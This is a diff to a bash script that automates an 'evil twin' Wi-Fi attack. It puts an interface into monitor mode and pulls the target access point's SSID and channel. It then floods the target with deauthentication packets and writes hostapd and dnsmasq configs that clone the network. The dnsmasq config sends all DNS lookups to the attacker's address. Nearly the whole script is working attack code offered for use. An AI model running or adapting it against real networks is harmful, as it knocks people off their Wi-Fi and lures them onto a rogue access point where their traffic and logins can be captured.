@@ -26,8 +26,6 @@ else
     exit
 fi
 
-
-
 clear
 
 # Check if interface is in managed mode
@@ -73,8 +71,11 @@ else
     
     # Start monitor mode
     ifconfig $interface down
+    sleep 1s
     iwconfig $interface mode monitor
+    sleep 1s
     ifconfig $interface up
+    sleep 1s
     if [ $? -eq 0 ]
     then
         echo "Monitor mode started"
@@ -84,8 +85,6 @@ else
     fi
 fi
 
-# terminal -e "airodump-ng $interface"
-##  wifi_scanner.py should be used here
 python3 wifi_scanner.py $interface
 
 echo "Enter the BSSID of the access point you want to attack"
@@ -99,37 +98,104 @@ then
     exit
 fi
 
-echo "Enter the channel you want to attack"
-read channel
+# get the ssid of the assid
+iwlist $interface scan | grep -i "$assid" | awk '{print $1}' > ssid.txt
+ssid=$(cat ssid.txt)
+rm ssid.txt
 
-# Exit if channel is not valid
-if [ -z "$channel" ]
-then
-    echo "Channel is not valid"
-    exit
-fi
 
-# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
+# get the channel of the assid
+iwlist $interface scan | grep -i "$assid" | awk '{print $4}' > channel.txt
+channel=$(cat channel.txt)
+rm channel.txt
 
-# Scan the channel of the BSSID
-echo "Scanning AP $channel"
 
-# timeout 5s airodump-ng $interface --bssid $assid --channel $channel
+
+
 python3 ap_scanner.py $interface $assid
 
 echo "Sending deAuth packets to the dest mac ap"
 ifconfig
-echo "Enter the other network card"
-read otherIface
+echo "Enter an interface to perform the attack, note that it should be different from the interface you've choose before."
+read attackerInterface
 
-python3 deauth_good.py $otherIface $assid
+python3 deauth_good.py $attackerInterface $assid
+
+
+
+
+# creates an pap/hostapd.conf file for hostapd to use 
+
+  echo "interface=$interface" > pap/hostapd.conf
+  echo "driver=nl80211" >> pap/hostapd.conf
+  echo "ssid=$ssid" >> pap/hostapd.conf
+  echo "hw_mode=g" >> pap/hostapd.conf
+  echo "channel=$channel" >> pap/hostapd.conf
+  echo "ignore_broadcast_ssid=0" >> pap/hostapd.conf
+
+# creates an dnsmasq.conf file for dnsmasq to use
+echo "interface=$interface" > dnsmasq.conf
+echo "dhcp-range=192.168.1.10,192.168.1.250,12h" >> dnsmasq.conf
+echo "dhcp-option=1,255.255.255.0" >> dnsmasq.conf
+echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
+echo "dhcp-option=6,192.168.1.1" >> dnsmasq.conf
+echo "server=8.8.8.8" >> dnsmasq.conf
+echo "log-queries" >> dnsmasq.conf
+echo "log-dhcp" >> dnsmasq.conf
+echo "address=/#/192.168.1.1" >> dnsmasq.conf
+echo "dnsmasq -C pap/dnsmasq.conf -d" >> dnsmasq.conf
+
+
+
 
 # Fake an access point with assid as BSSID and channel as channel of the AP
 # timeout 5s aireplay-ng -1 0 -a $assid -h $tarssid $interface
 echo "Starting fake access point"
-sh hostapd.sh
-sleep 8s
-sh dnsmasq.sh
+
+
+
+
+
+# Run in new thread the hostapd.sh script
+sudo sh hostapd.sh & 
+sudo sh dnsmasq.sh &
+wait
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #enter mac address of client we want to disconnect // example of aircrack-ng
 # echo -e "\n\nEnter MAC address of victim"
@@ -137,7 +203,7 @@ sh dnsmasq.sh
 
 # python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface
 
-timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
+# timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
 
 
 
@@ -146,9 +212,13 @@ timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
 
 
 # Deauthanticate the target
-echo "Deauthing target"
-aireplay-ng -0 0 -a $assid -h $tarssid $interface
+# echo "Deauthing target"
+# aireplay-ng -0 0 -a $assid -h $tarssid $interface
 
 #   wlx6c5ab03ab2f5
 #   32:07:4D:4D:BD:1A
 #   11
+
+
+
+
